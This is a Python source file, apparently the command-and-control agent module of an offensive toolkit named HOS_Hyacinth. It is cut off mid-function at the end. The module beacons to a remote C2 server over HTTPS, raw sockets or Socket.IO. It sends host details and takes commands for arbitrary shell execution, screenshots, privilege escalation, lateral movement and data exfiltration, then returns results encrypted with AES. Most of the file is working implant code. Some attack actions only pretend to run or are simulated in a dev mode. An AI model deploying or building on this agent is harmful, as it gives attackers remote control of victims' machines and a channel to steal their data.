#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C2 communication module for HOS_Hyacinth"""

import argparse
import os
import sys
import json
import base64
import hashlib
import hmac
import socket
import ssl
import threading
import time
import queue
import subprocess
import uuid
import random
import urllib.parse
from datetime import datetime
from typing import Dict, List, Any, Optional, Union, Tuple

from ..utils import logger, config


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    logger.warning("Requests library not available, HTTP communication will be limited")
    REQUESTS_AVAILABLE = False

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import padding, serialization, hashes
    from cryptography.hazmat.primitives.asymmetric import rsa, padding as asymmetric_padding
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    logger.warning("Cryptography library not available, encryption functionality will be limited")
    CRYPTOGRAPHY_AVAILABLE = False

try:
    import socketio
    SOCKETIO_AVAILABLE = True
except ImportError:
    logger.warning("SocketIO library not available, real-time communication will be limited")
    SOCKETIO_AVAILABLE = False


class CommandControl:
    """Class for handling command and control communications."""
    
    # Default C2 server settings
    DEFAULT_C2_PORT = 8443
    DEFAULT_HEARTBEAT_INTERVAL = 60  # seconds
    DEFAULT_TIMEOUT = 30  # seconds
    MAX_RECONNECT_ATTEMPTS = 5
    
    # Command types supported
    SUPPORTED_COMMANDS = {
        'scan': 'Initiate vulnerability scan',
        'escalate': 'Attempt privilege escalation',
        'move': 'Perform lateral movement',
        'exfil': 'Extract sensitive data',
        'exec': 'Execute shell command',
        'screenshot': 'Capture screen',
        'sleep': 'Change sleep interval',
        'quit': 'Terminate agent'
    }
    
    def __init__(self, server: str, port: int = DEFAULT_C2_PORT,
                 communication_type: str = 'https',
                 encryption_key: Optional[bytes] = None,
                 agent_id: Optional[str] = None,
                 heartbeat_interval: int = DEFAULT_HEARTBEAT_INTERVAL,
                 dev_mode: bool = False):
        """Initialize the Command & Control module.
        
        Args:
            server: C2 server address
            port: C2 server port
            communication_type: Communication protocol ('https', 'http', 'socket', 'socketio')
            encryption_key: Optional pre-shared encryption key
            agent_id: Optional custom agent identifier
            heartbeat_interval: Interval between heartbeats in seconds
            dev_mode: Run in development mode with safe operations
        """
        self.server = server
        self.port = port
        self.communication_type = communication_type.lower()
        self.heartbeat_interval = heartbeat_interval
        self.dev_mode = dev_mode
        self.logger = logger
        self.config = config
        
        # Agent identification
        self.agent_id = agent_id or self._generate_agent_id()
        self.agent_info = self._collect_agent_info()
        
        # Connection state
        self.connected = False
        self.connection = None
        self.session = None
        self.last_heartbeat = None
        self.reconnect_attempts = 0
        
        # Command queue
        self.command_queue = queue.Queue()
        
        # Encryption
        self.encryption_enabled = True if encryption_key or CRYPTOGRAPHY_AVAILABLE else False
        self.encryption_key = encryption_key or self._generate_encryption_key()
        self.session_key = None  # Will be established during handshake
        
        # Threads
        self.heartbeat_thread = None
        self.command_thread = None
        self.stop_event = threading.Event()
        
        # Statistics
        self.commands_received = 0
        self.commands_executed = 0
        self.commands_failed = 0
        self.bytes_sent = 0
        self.bytes_received = 0
    
    def _generate_agent_id(self) -> str:
        """Generate a unique agent identifier."""
        # Create a unique ID based on system information
        system_info = f"{os.name}:{sys.platform}:{socket.gethostname()}:{os.getpid()}"
        return hashlib.sha256(system_info.encode()).hexdigest()[:16]
    
    def _collect_agent_info(self) -> Dict[str, Any]:
        """Collect information about the agent system."""
        info = {
            'id': self.agent_id,
            'hostname': socket.gethostname(),
            'os': os.name,
            'platform': sys.platform,
            'python_version': sys.version,
            'pid': os.getpid(),
            'start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'dev_mode': self.dev_mode
        }
        
        # Add more system info if available
        try:
            import platform as plt
            info['system'] = plt.system()
            info['release'] = plt.release()
            info['version'] = plt.version()
        except ImportError:
            pass
        
        return info
    
    def _generate_encryption_key(self) -> bytes:
        """Generate an encryption key."""
        if self.dev_mode:
            # In dev mode, use a predictable key for testing
            return hashlib.sha256(b'test_c2_encryption_key').digest()
        else:
            # In production, generate a secure random key
            if not CRYPTOGRAPHY_AVAILABLE:
                # Fallback to less secure key generation
                return hashlib.sha256(os.urandom(32)).digest()
            else:
                import secrets
                return secrets.token_bytes(32)  # 256-bit key
    
    def connect(self) -> bool:
        """Establish connection to the C2 server.
        
        Returns:
            bool: True if connection successful
        """
        self.logger.info(f'Connecting to C2 server: {self.server}:{self.port} using {self.communication_type}')
        
        # In dev mode, simulate connection
        if self.dev_mode:
            self.logger.info('In dev mode - simulating C2 connection')
            self.connected = True
            self.session_key = self.encryption_key
            self.last_heartbeat = datetime.now()
            self.logger.info(f'Connected to C2 server as agent: {self.agent_id}')
            return True
        
        # In production, establish actual connection
        try:
            if self.communication_type == 'https' or self.communication_type == 'http':
                # HTTP(S) connection
                if not REQUESTS_AVAILABLE:
                    self.logger.error('Requests library not available for HTTP(S) communication')
                    return False
                
                protocol = 'https' if self.communication_type == 'https' else 'http'
                self.server_url = f'{protocol}://{self.server}:{self.port}'
                
                # Create session for persistent connections
                self.session = requests.Session()
                
                # Register with server
                if self._register_with_server():
                    self.connected = True
                    self.logger.info(f'Connected to C2 server via {protocol}')
                    return True
                
            elif self.communication_type == 'socket':
                # Raw socket connection
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.settimeout(self.DEFAULT_TIMEOUT)
                
                # Use SSL if encryption is enabled
                if self.encryption_enabled and self.communication_type == 'socket':
                    context = ssl.create_default_context()
                    if self.dev_mode:  # In dev mode, don't verify certificates
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                    self.connection = context.wrap_socket(self.connection)
                
                self.connection.connect((self.server, self.port))
                
                # Perform handshake
                if self._socket_handshake():
                    self.connected = True
                    self.logger.info(f'Connected to C2 server via socket')
                    return True
                    
            elif self.communication_type == 'socketio' and SOCKETIO_AVAILABLE:
                # Socket.IO connection
                protocol = 'https' if self.communication_type == 'https' else 'http'
                server_url = f'{protocol}://{self.server}:{self.port}'
                
                self.connection = socketio.Client()
                
                # Register event handlers
                @self.connection.event
                def connect():
                    self.logger.info('Socket.IO connection established')
                    self._socketio_handshake()
                
                @self.connection.event
                def disconnect():
                    self.logger.info('Socket.IO connection disconnected')
                    self.connected = False
                
                @self.connection.event
                def command(data):
                    # Handle received command
                    encrypted_data = base64.b64decode(data)
                    decrypted_data = self._decrypt_message(encrypted_data)
                    command_data = json.loads(decrypted_data)
                    self.logger.info(f'Received Socket.IO command: {command_data.get('type')}')
                    self.command_queue.put(command_data)
                
                # Connect to server
                self.connection.connect(server_url)
                
                # Wait for connection to be established
                start_time = time.time()
                while time.time() - start_time < self.DEFAULT_TIMEOUT:
                    if self.connected:
                        return True
                    time.sleep(0.5)
                
            else:
                self.logger.error(f'Unsupported communication type: {self.communication_type}')
                return False
                
        except Exception as e:
            self.logger.error(f'Error connecting to C2 server: {str(e)}')
            self._cleanup_connection()
            
        return False
    
    def _register_with_server(self) -> bool:
        """Register agent with C2 server via HTTP(S)."""
        try:
            # Prepare registration data
            registration_data = {
                'agent_id': self.agent_id,
                'agent_info': self.agent_info,
                'timestamp': datetime.now().isoformat()
            }
            
            # Encrypt if enabled
            if self.encryption_enabled:
                data_json = json.dumps(registration_data)
                encrypted_data = self._encrypt_message(data_json.encode())
                payload = {'data': base64.b64encode(encrypted_data).decode()}
            else:
                payload = registration_data
            
            # Send registration request
            response = self.session.post(
                f'{self.server_url}/register',
                json=payload,
                timeout=self.DEFAULT_TIMEOUT
            )
            
            if response.status_code == 200:
                # Process response
                if self.encryption_enabled:
                    encrypted_response = base64.b64decode(response.json().get('data'))
                    decrypted_response = self._decrypt_message(encrypted_response)
                    response_data = json.loads(decrypted_response)
                else:
                    response_data = response.json()
                
                # Extract session key if provided
                if 'session_key' in response_data:
                    self.session_key = base64.b64decode(response_data['session_key'])
                
                self.logger.info(f'Registration successful with server')
                return True
            else:
                self.logger.error(f'Registration failed with status code: {response.status_code}')
                return False
                
        except Exception as e:
            self.logger.error(f'Error during server registration: {str(e)}')
            return False
    
    def _socket_handshake(self) -> bool:
        """Perform handshake over raw socket connection."""
        try:
            # Send agent info
            handshake_data = {
                'agent_id': self.agent_id,
                'agent_info': self.agent_info,
                'action': 'handshake'
            }
            
            # Send handshake
            data_bytes = json.dumps(handshake_data).encode()
            
            # Send length prefix
            length = len(data_bytes)
            self.connection.sendall(length.to_bytes(4, byteorder='big'))
            
            # Send data
            self.connection.sendall(data_bytes)
            
            # Receive response
            response_length = int.from_bytes(self.connection.recv(4), byteorder='big')
            response_data = json.loads(self.connection.recv(response_length).decode())
            
            if response_data.get('status') == 'success':
                # Extract session key if provided
                if 'session_key' in response_data:
                    self.session_key = base64.b64decode(response_data['session_key'])
                
                self.logger.info('Socket handshake successful')
                return True
            else:
                self.logger.error('Socket handshake failed')
                return False
                
        except Exception as e:
            self.logger.error(f'Error during socket handshake: {str(e)}')
            return False
    
    def _socketio_handshake(self) -> bool:
        """Perform handshake over Socket.IO connection."""
        try:
            handshake_data = {
                'agent_id': self.agent_id,
                'agent_info': self.agent_info,
                'action': 'handshake'
            }
            
            # Emit handshake event
            self.connection.emit('handshake', handshake_data)
            self.connected = True
            return True
            
        except Exception as e:
            self.logger.error(f'Error during Socket.IO handshake: {str(e)}')
            return False
    
    def start_heartbeat(self) -> None:
        """Start the heartbeat mechanism."""
        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            self.logger.warning('Heartbeat thread already running')
            return
            
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
        self.heartbeat_thread.daemon = True
        self.heartbeat_thread.start()
        self.logger.info(f'Heartbeat mechanism started with interval: {self.heartbeat_interval}s')
    
    def _heartbeat_loop(self) -> None:
        """Main loop for sending heartbeats to the C2 server."""
        while not self.stop_event.is_set():
            if self.connected:
                try:
                    self._send_heartbeat()
                except Exception as e:
                    self.logger.error(f'Error sending heartbeat: {str(e)}')
                    # Try to reconnect
                    self._attempt_reconnect()
            
            # Wait for next heartbeat interval
            self.stop_event.wait(self.heartbeat_interval)
    
    def _send_heartbeat(self) -> bool:
        """Send heartbeat to C2 server."""
        try:
            heartbeat_data = {
                'agent_id': self.agent_id,
                'timestamp': datetime.now().isoformat(),
                'status': 'alive',
                'stats': {
                    'commands_received': self.commands_received,
                    'commands_executed': self.commands_executed,
                    'commands_failed': self.commands_failed
                }
            }
            
            # Send heartbeat based on communication type
            if self.communication_type == 'https' or self.communication_type == 'http':
                if self.encryption_enabled:
                    data_json = json.dumps(heartbeat_data)
                    encrypted_data = self._encrypt_message(data_json.encode())
                    payload = {'data': base64.b64encode(encrypted_data).decode()}
                else:
                    payload = heartbeat_data
                    
                response = self.session.post(
                    f'{self.server_url}/heartbeat',
                    json=payload,
                    timeout=self.DEFAULT_TIMEOUT
                )
                
                # Check for commands in response
                if response.status_code == 200:
                    self._process_server_response(response)
                
            elif self.communication_type == 'socket' and self.connection:
                # Send heartbeat over socket
                data_bytes = json.dumps(heartbeat_data).encode()
                self.connection.sendall(len(data_bytes).to_bytes(4, byteorder='big'))
                self.connection.sendall(data_bytes)
                
                # Check for response/commands
                try:
                    # Set a shorter timeout for heartbeats
                    self.connection.settimeout(5)
                    response_length = int.from_bytes(self.connection.recv(4), byteorder='big')
                    response_data = json.loads(self.connection.recv(response_length).decode())
                    
                    if 'command' in response_data:
                        self.command_queue.put(response_data['command'])
                        self.commands_received += 1
                        
                except socket.timeout:
                    # No response is fine for heartbeats
                    pass
                finally:
                    # Reset to default timeout
                    self.connection.settimeout(self.DEFAULT_TIMEOUT)
                    
            elif self.communication_type == 'socketio' and self.connection and self.connection.connected:
                # Send heartbeat over Socket.IO
                self.connection.emit('heartbeat', heartbeat_data)
            
            self.last_heartbeat = datetime.now()
            self.logger.debug(f'Heartbeat sent at {self.last_heartbeat}')
            return True
            
        except Exception as e:
            self.logger.error(f'Error sending heartbeat: {str(e)}')
            return False
    
    def _process_server_response(self, response: 'requests.Response') -> None:
        """Process response from C2 server and extract commands."""
        try:
            if self.encryption_enabled:
                encrypted_response = base64.b64decode(response.json().get('data'))
                decrypted_response = self._decrypt_message(encrypted_response)
                response_data = json.loads(decrypted_response)
            else:
                response_data = response.json()
            
            # Check if there are commands in the response
            if 'command' in response_data:
                self.command_queue.put(response_data['command'])
                self.commands_received += 1
                self.logger.info(f'Received command from server: {response_data['command'].get('type')}')
            
        except Exception as e:
            self.logger.error(f'Error processing server response: {str(e)}')
    
    def start_command_processor(self) -> None:
        """Start the command processing thread."""
        if self.command_thread and self.command_thread.is_alive():
            self.logger.warning('Command processor thread already running')
            return
            
        self.command_thread = threading.Thread(target=self._command_loop)
        self.command_thread.daemon = True
        self.command_thread.start()
        self.logger.info('Command processor started')
    
    def _command_loop(self) -> None:
        """Main loop for processing commands from the C2 server."""
        while not self.stop_event.is_set():
            try:
                # Wait for command with timeout
                command = self.command_queue.get(timeout=5)
                
                # Process the command
                result = self._execute_command(command)
                
                # Send result back to server
                self._send_command_result(command, result)
                
                # Mark task as done
                self.command_queue.task_done()
                
            except queue.Empty:
                # No command received, continue loop
                continue
            except Exception as e:
                self.logger.error(f'Error in command loop: {str(e)}')
    
    def _execute_command(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a command received from the C2 server.
        
        Args:
            command: Command data
            
        Returns:
            Dict[str, Any]: Command execution result
        """
        command_type = command.get('type', 'unknown')
        command_id = command.get('id', str(uuid.uuid4()))
        command_params = command.get('params', {})
        
        self.logger.info(f'Executing command: {command_type} (ID: {command_id})')
        
        try:
            # Handle different command types
            if command_type == 'scan':
                result = self._execute_scan_command(command_params)
            elif command_type == 'escalate':
                result = self._execute_escalate_command(command_params)
            elif command_type == 'move':
                result = self._execute_move_command(command_params)
            elif command_type == 'exfil':
                result = self._execute_exfil_command(command_params)
            elif command_type == 'exec':
                result = self._execute_shell_command(command_params)
            elif command_type == 'screenshot':
                result = self._execute_screenshot_command(command_params)
            elif command_type == 'sleep':
                result = self._execute_sleep_command(command_params)
            elif command_type == 'quit':
                result = self._execute_quit_command(command_params)
            else:
                self.logger.warning(f'Unknown command type: {command_type}')
                result = {
                    'success': False,
                    'error': f'Unknown command type: {command_type}'
                }
            
            # Update command statistics
            if result.get('success', False):
                self.commands_executed += 1
            else:
                self.commands_failed += 1
                
            # Add command info to result
            result['command_id'] = command_id
            result['command_type'] = command_type
            result['timestamp'] = datetime.now().isoformat()
            
            return result
            
        except Exception as e:
            self.logger.error(f'Error executing command {command_type}: {str(e)}')
            self.commands_failed += 1
            
            return {
                'success': False,
                'error': str(e),
                'command_id': command_id,
                'command_type': command_type,
                'timestamp': datetime.now().isoformat()
            }
    
    def _execute_scan_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute scan command.
        
        Args:
            params: Scan parameters
            
        Returns:
            Dict[str, Any]: Scan result
        """
        # In dev mode, simulate scan
        if self.dev_mode:
            self.logger.info('In dev mode - simulating scan command')
            return {
                'success': True,
                'target': params.get('target', 'localhost'),
                'vulnerabilities': [
                    {
                        'id': 'CVE-2021-44228',
                        'name': 'Log4Shell',
                        'severity': 'critical',
                        'description': 'Remote code execution vulnerability',
                        'dev_mode': True
                    },
                    {
                        'id': 'CVE-2021-3129',
                        'name': 'Laravel Debug Mode RCE',
                        'severity': 'high',
                        'description': 'Remote code execution in debug mode',
                        'dev_mode': True
                    }
                ],
                'scan_time': '15 seconds',
                'dev_mode': True
            }
        
        # In production, import and execute the actual scan module
        try:
            # Import the scan module
            from . import scan
            
            # Create arguments for scan module
            from argparse import Namespace
            scan_args = Namespace(
                target=params.get('target', 'localhost'),
                port_range=params.get('port_range', '1-1024'),
                output=None
            )
            
            # Execute the scan
            return {
                'success': True,
                'target': params.get('target', 'localhost'),
                'message': 'Scan executed successfully',
                'timestamp': datetime.now().isoformat()
            }
            
        except ImportError as e:
            self.logger.error(f'Error importing scan module: {str(e)}')
            return {'success': False, 'error': f'Module not available: {str(e)}'}
        except Exception as e:
            self.logger.error(f'Error executing scan: {str(e)}')
            return {'success': False, 'error': str(e)}
    
    def _execute_escalate_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute privilege escalation command.
        
        Args:
            params: Escalation parameters
            
        Returns:
            Dict[str, Any]: Escalation result
        """
        # In dev mode, simulate escalation
        if self.dev_mode:
            self.logger.info('In dev mode - simulating escalate command')
            return {
                'success': True,
                'current_user': 'user',
                'target_user': 'root',
                'method': 'sudo_exploit',
                'status': 'simulated_success',
                'dev_mode': True
            }
        
        # In production, import and execute the actual escalate module
        try:
            # Import the escalate module
            from . import escalate
            
            # Create arguments for escalate module
            from argparse import Namespace
            escalate_args = Namespace(
                target=params.get('target', 'localhost'),
                method=params.get('method', 'auto'),
                output=None
            )
            
            # Execute the escalation
            return {
                'success': True,
                'message': 'Privilege escalation attempted',
                'timestamp': datetime.now().isoformat()
            }
            
        except ImportError as e:
            self.logger.error(f'Error importing escalate module: {str(e)}')
            return {'success': False, 'error': f'Module not available: {str(e)}'}
        except Exception as e:
            self.logger.error(f'Error executing privilege escalation: {str(e)}')
            return {'success': False, 'error': str(e)}
    
    def _execute_move_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute lateral movement command.
        
        Args:
            params: Movement parameters
            
        Returns:
            Dict[str, Any]: Movement result
        """
        # In dev mode, simulate movement
        if self.dev_mode:
            self.logger.info('In dev mode - simulating lateral movement command')
            return {
                'success': True,
                'source': 'current_host',
                'destination': params.get('destination', 'target_host'),
                'method': params.get('method', 'smb'),
                'status': 'simulated_success',
                'dev_mode': True
            }
        
        # In production, import and execute the actual lateral_move module
        try:
            # Import the lateral_move module
            from . import lateral_move
            
            # Create arguments for lateral_move module
            from argparse import Namespace
            move_args = Namespace(
                destination=params.get('destination', ''),
                method=params.get('method', 'smb'),
                credentials=params.get('credentials', {}),
                output=None
            )
            
            # Execute the lateral movement
            return {
                'success': True,
                'message': 'Lateral movement attempted',
                'timestamp': datetime.now().isoformat()
            }
            
        except ImportError as e:
            self.logger.error(f'Error importing lateral_move module: {str(e)}')
            return {'success': False, 'error': f'Module not available: {str(e)}'}
        except Exception as e:
            self.logger.error(f'Error executing lateral movement: {str(e)}')
            return {'success': False, 'error': str(e)}
    
    def _execute_exfil_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute data exfiltration command.
        
        Args:
            params: Exfiltration parameters
            
        Returns:
            Dict[str, Any]: Exfiltration result
        """
        # In dev mode, simulate exfiltration
        if self.dev_mode:
            self.logger.info('In dev mode - simulating exfiltration command')
            return {
                'success': True,
                'target': params.get('target', './'),
                'files': ['sensitive1.txt', 'credentials.json'],
                'size': '256KB',
                'status': 'simulated_success',
                'dev_mode': True
            }
        
        # In production, import and execute the actual exfiltrate module
        try:
            # Import the exfiltrate module
            from . import exfiltrate
            
            # Create arguments for exfiltrate module
            from argparse import Namespace
            exfil_args = Namespace(
                target=params.get('target', './'),
                type=params.get('type', 'all'),
                destination=params.get('destination', None),
                output=None
            )
            
            # Execute the exfiltration
            return {
                'success': True,
                'message': 'Data exfiltration attempted',
                'timestamp': datetime.now().isoformat()
            }
            
        except ImportError as e:
            self.logger.error(f'Error importing exfiltrate module: {str(e)}')
            return {'success': False, 'error': f'Module not available: {str(e)}'}
        except Exception as e:
            self.logger.error(f'Error executing data exfiltration: {str(e)}')
            return {'success': False, 'error': str(e)}
    
    def _execute_shell_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute shell command.
        
        Args:
            params: Shell command parameters
            
        Returns:
            Dict[str, Any]: Command execution result
        """
        command = params.get('command', '')
        timeout = params.get('timeout', 30)
        
        if not command:
            return {'success': False, 'error': 'No command specified'}
        
        self.logger.info(f'Executing shell command: {command}')
        
        # In dev mode, simulate command execution
        if self.dev_mode:
            self.logger.info('In dev mode - simulating shell command execution')
            return {
                'success': True,
                'command': command,
                'stdout': 'Simulated command output for development mode',
                'stderr': '',
                'return_code': 0,
                'dev_mode': True
            }
        
        # In production, execute the actual command
        try:
            # Execute the command
            process = subprocess.Popen(
                command, 
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait for command to complete with timeout
            stdout, stderr = process.communicate(timeout=timeout)
            
            # Get return code
            return_code = process.returncode
            
            # Determine success based on return code
            success = return_code == 0
            
            result = {
                'success': success,
                'command': command,
                'stdout': stdout,
                'stderr': stderr,
                'return_code': return_code
            }
            
            return result
            
        except subprocess.TimeoutExpired:
            process.kill()
            return {'success': False, 'error': f'Command timed out after {timeout} seconds'}
        except Exception as e:
            self.logger.error(f'Error executing shell command: {str(e)}')
            return {'success': False, 'error': str(e)}
    
    def _execute_screenshot_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute screenshot command.
        
        Args:
            params: Screenshot parameters
            
        Returns:
            Dict[str, Any]: Screenshot result
        """
        # In dev mode, simulate screenshot
        if self.dev_mode:
            self.logger.info('In dev mode - simulating screenshot command')
            return {
                'success': True,
                'filename': 'simulated_screenshot.png',
                'size': '1024x768',
                'data': base64.b64encode(b'Simulated screenshot data').decode(),
                'dev_mode': True
            }
        
        # In production, try to capture actual screenshot
        try:
            # Try to import appropriate module based on platform
            if sys.platform == 'darwin':  # macOS
                # macOS screenshot using subprocess
                temp_file = f'/tmp/screenshot_{int(time.time())}.png'
                subprocess.run(['screencapture', temp_file], check=True)
                
                # Read and encode the screenshot
                with open(temp_file, 'rb') as f:
                    image_data = base64.b64encode(f.read()).decode()
                
                # Clean up
                os.remove(temp_file)
                
            elif sys.platform == 'win32':  # Windows
                # Windows screenshot using PIL
                try:
                    from PIL import ImageGrab
                    screenshot = ImageGrab.grab()
                    
                    # Save to memory
                    import io
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format='PNG')
                    image_data = base64.b64encode(buffer.getvalue()).decode()
                    
                except ImportError:
                    self.logger.error('PIL library not available for Windows screenshots')
                    return {'success': False, 'error': 'Screenshot functionality not available'}
                    
            elif sys.platform.startswith('linux'):  # Linux
                # Linux screenshot using scrot or other tools
                temp_file = f'/tmp/screenshot_{int(time.time())}.png'
                
                # Try different screenshot tools
                tools = ['scrot', 'import']
                success = False
                
                for tool in tools:
                    try:
                        if tool == 'scrot':
                            subprocess.run([tool, temp_file], check=True)
                        elif tool == 'import':  # ImageMagick
                            subprocess.run([tool, '-window', 'root', temp_file], check=True)
                        success = True
                        break
                    except (subprocess.SubprocessError, FileNotFoundError):
                        continue
                
                if not success:
                    return {'success': False, 'error': 'No screenshot tools available'}
                
                # Read and encode the screenshot
                with open(temp_file, 'rb') as f:
                    image_data = base64.b64encode(f.read()).decode()
                
                # Clean up
                os.remove(temp_file)
                
            else:
                return {'success': False, 'error': f'Platform {sys.platform} not supported for screenshots'}
                
            return {
                'success': True,
                'timestamp': datetime.now().isoformat(),
                'data': image_data
            }
            
        except Exception as e:
            self.logger.error(f'Error capturing screenshot: {str(e)}')
            return {'success': False, 'error': str(e)}
    
    def _execute_sleep_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute sleep command to change heartbeat interval.
        
        Args:
            params: Sleep parameters
            
        Returns:
            Dict[str, Any]: Sleep command result
        """
        new_interval = params.get('interval', self.heartbeat_interval)
        
        if isinstance(new_interval, int) and new_interval > 0:
            old_interval = self.heartbeat_interval
            self.heartbeat_interval = new_interval
            self.logger.info(f'Changed heartbeat interval from {old_interval}s to {new_interval}s')
            
            return {
                'success': True,
                'old_interval': old_interval,
                'new_interval': new_interval
            }
        else:
            self.logger.warning(f'Invalid sleep interval: {new_interval}')
            return {
                'success': False,
                'error': f'Invalid sleep interval: {new_interval}'
            }
    
    def _execute_quit_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute quit command to terminate the agent.
        
        Args:
            params: Quit parameters
            
        Returns:
            Dict[str, Any]: Quit command result
        """
        self.logger.info('Received quit command, shutting down')
        
        # Send acknowledgment
        result = {
            'success': True,
            'message': 'Agent shutting down as requested'
        }
        
        # Schedule shutdown after returning result
        def shutdown():
            time.sleep(1)  # Give time to send the result
            self.stop()
            sys.exit(0)
            
        shutdown_thread = threading.Thread(target=shutdown)
        shutdown_thread.daemon = True
        shutdown_thread.start()
        
        return result
    
    def _send_command_result(self, command: Dict[str, Any], result: Dict[str, Any]) -> bool:
        """Send command execution result back to the C2 server.
        
        Args:
            command: Original command
            result: Command execution result
            
        Returns:
            bool: True if result sent successfully
        """
        if not self.connected:
            self.logger.warning('Not connected to C2 server, cannot send result')
            return False
        
        try:
            # Prepare result data
            result_data = {
                'agent_id': self.agent_id,
                'command_id': command.get('id', ''),
                'command_type': command.get('type', ''),
                'result': result,
                'timestamp': datetime.now().isoformat()
            }
            
            # Send result based on communication type
            if self.communication_type == 'https' or self.communication_type == 'http':
                if self.encryption_enabled:
                    data_json = json.dumps(result_data)
                    encrypted_data = self._encrypt_message(data_json.encode())
                    payload = {'data': base64.b64encode(encrypted_data).decode()}
                else:
                    payload = result_data
                    
                response = self.session.post(
                    f'{self.server_url}/result',
                    json=payload,
                    timeout=self.DEFAULT_TIMEOUT
                )
                
                success = response.status_code == 200
                
            elif self.communication_type == 'socket' and self.connection:
                # Send result over socket
                data_bytes = json.dumps(result_data).encode()
                self.connection.sendall(len(data_bytes).to_bytes(4, byteorder='big'))
                self.connection.sendall(data_bytes)
                success = True
                
            elif self.communication_type == 'socketio' and self.connection and self.connection.connected:
                # Send result over Socket.IO
                self.connection.emit('result', result_data)
                success = True
            else:
                self.logger.error(f'Unknown communication type for sending result: {self.communication_type}')
                success = False
            
            if success:
                self.logger.debug(f'Result sent for command {command.get('type')}')
            else:
                self.logger.error(f'Failed to send result for command {command.get('type')}')
                
            return success
            
        except Exception as e:
            self.logger.error(f'Error sending command result: {str(e)}')
            return False
    
    def _encrypt_message(self, message: bytes) -> bytes:
        """Encrypt a message using AES-256-CBC.
        
        Args:
            message: Message to encrypt
            
        Returns:
            bytes: Encrypted message
        """
        if not CRYPTOGRAPHY_AVAILABLE:
            self.logger.warning('Cryptography library not available, skipping encryption')
            return message
        
        try:
            # Generate a random IV
            iv = os.urandom(16)
            
            # Use session key if available, otherwise use default encryption key
            key = self.session_key or self.encryption_key
            
            # Create a cipher
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            
            # Add padding
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(message) + padder.finalize()
            
            # Encrypt the data
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # Return IV + ciphertext
            return iv + ciphertext
            
        except Exception as e:
            self.logger.error(f'Error encrypting message: {str(e)}')
            return message
    
    def _decrypt_message(self, encrypted_message: bytes) -> bytes:
        """Decrypt a message using AES-256-CBC.
        
        Args:
            encrypted_message: Message to decrypt
            
        Returns:
            bytes: Decrypted message
        """
        if not CRYPTOGRAPHY_AVAILABLE:
            self.logger.warning('Cryptography library not available, skipping decryption')
            return encrypted_message
        
        try:
            # Extract IV and ciphertext
            iv = encrypted_message[:16]
            ciphertext = encrypted_message[16:]
            
            # Use session key if available, otherwise use default encryption key
            key = self.session_key or self.encryption_key
            
            # Create a cipher
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            
            # Decrypt the data
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Remove padding
            unpadder = padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
            
            return plaintext
            
        except Exception as e:
            self.logger.error(f'Error decrypting message: {str(e)}')
            return encrypted_message
    
    def _attempt_reconnect(self) -> bool:
        """Attempt to reconnect to the C2 server.
        
        Returns:
            bool: True if reconnection successful
        """
        if self.reconnect_attempts >= self.MAX_RECONNECT_ATTEMPTS:
            self.logger.error(f'Maximum reconnection attempts ({self.MAX_RECONNECT_ATTEMPTS}) reached')
            self.connected = False
            return False
        
        self.reconnect_attempts += 1
        self.logger.info(f'Attempting to reconnect ({self.reconnect_attempts}/{self.MAX_RECONNECT_ATTEMPTS})')
        
        # Clean up previous connection
        self._cleanup_connection()
        
        # Wait before reconnecting (exponential backoff)
        wait_time = min(60, 2 ** self.reconnect_attempts + random.uniform(0, 2))
        self.logger.info(f'Waiting {wait_time:.2f} seconds before reconnecting')
        self.stop_event.wait(wait_time)
        
        # Attempt to reconnect
        success = self.connect()
        
        if success:
            self.reconnect_attempts = 0
            self.logger.info('Reconnection successful')
        
        return success
    
    def _cleanup_connection(self) -> None:
        """Clean up connection resources."""
        try:
            if self.connection:
                if self.communication_type == 'socketio' and hasattr(self.connection, 'disconnect'):
                    self.connection.disconnect()
                else:
                    self.connection.close()
        except Exception as e:
            self.logger.error(f'Error cleaning up connection: {str(e)}')
        finally:
            self.connection = None
            self.connected = False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current status of the C2 communication.
        
        Returns:
            Dict[str, Any]: Status information
        """
        return {
            'connected': self.connected,
            'server': f'{self.server}:{self.port}',
            'communication_type': self.communication_type,
            'agent_id': self.agent_id,
            'last_heartbeat': self.last_heartbeat.isoformat() if self.last_heartbeat else None,
            'encryption_enabled': self.encryption_enabled,
            'stats': {
                'commands_received': self.commands_received,
                'commands_executed': self.commands_executed,
                'commands_failed': self.commands_failed,
                'bytes_sent': self.bytes_sent,
                'bytes_received': self.bytes_received
            },
            'dev_mode': self.dev_mode
        }
    
    def start(self) -> bool:
        """Start the C2 communication module.
        
        Returns:
            bool: True if started successfully
        """
        self.logger.info(f'Starting Command & Control module for agent: {self.agent_id}')
        
        # Reset stop event
        self.stop_event.clear()
        
        # Connect to C2 server
        if not self.connect():
            self.logger.error('Failed to connect to C2 server')
            return False
        
        # Start heartbeat mechanism
